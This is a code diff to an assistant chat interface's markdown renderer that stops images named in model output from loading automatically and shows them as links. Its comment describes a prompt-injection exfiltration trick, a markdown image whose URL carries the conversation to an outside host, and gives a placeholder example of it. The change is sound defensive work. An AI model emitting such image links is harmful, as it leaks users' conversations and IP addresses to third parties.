@@ -40,6 +40,11 @@ function SafeLink({ href, children }: { href?: string; children: ReactNode }) {
 
 const assistantComponents: Components = {
   a: ({ href, children }) => <SafeLink href={href}>{children}</SafeLink>,
+  // Never auto-load images named by model output: a prompt-injected `![](https://host/?q=<chat>)` would
+  // leak the conversation and the viewer's IP to that host (SEC-15). Shown as a link the user may follow.
+  img: ({ src, alt }) => (
+    <SafeLink href={typeof src === "string" ? src : undefined}>{alt ? `[image: ${alt}]` : "[image]"}</SafeLink>
+  ),
   code: ({ className, children, ...props }) => {
     const isFenced = Boolean(className?.startsWith("language-"));
     if (!isFenced) {
